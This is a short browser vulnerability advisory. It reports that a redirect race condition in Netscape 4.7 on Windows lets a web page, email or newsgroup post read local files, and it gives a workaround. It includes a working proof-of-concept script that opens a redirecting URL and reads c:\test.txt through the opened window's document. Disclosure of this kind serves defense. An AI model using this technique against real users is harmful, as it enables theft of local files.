The first version of this document was created by Georgi Guninski, i
would like to report that this bug also works on netscape (Tested 4.7).
I added the document with needed changes for netscape.

Description:

Netscape under Windows 95 and NT 4.0 (suppose Win98 is
vulnerable) allows reading local text and HTML files and files from any
domain (probably reading files of other types of files is possible).
Window spoofing is possible.
It is also possible in some cases to read files behind fiewall.
This vulnerability may be exploited using HTML email message or a
newsgroup posting.

Details:

The problem is something like a race condition immediately after
window.open("HTTP-redirecting-URL").
If you do:
a=window.open("HTTP-redirecting-url");
b=a.document;
then you have access to the redirected URL's document using "b".

The code is:
----------------------------------------------------------------------------------------

<SCRIPT>
alert("Create short text file c:\\test.txt and it will be read and shown

in a message box");
a=window.open("http://www.nat.bg/~joro/reject.cgi?test.txt");
b=a.document;
setTimeout("alert(b.body.innerText);",4000);
</SCRIPT>
// "http://www.nat.bg/~joro/reject.cgi?test.txt" just does a HTTP
redirect to: "file://c:/test.txt"
----------------------------------------------------------------------------------------

Workaround:
Disable Active Scripting

Demonstration is available at http://www.nat.bg/~joro/msredir1.html

All credit is given to Georgi Guninski, i only tested it on netscape and
made sure it works there too
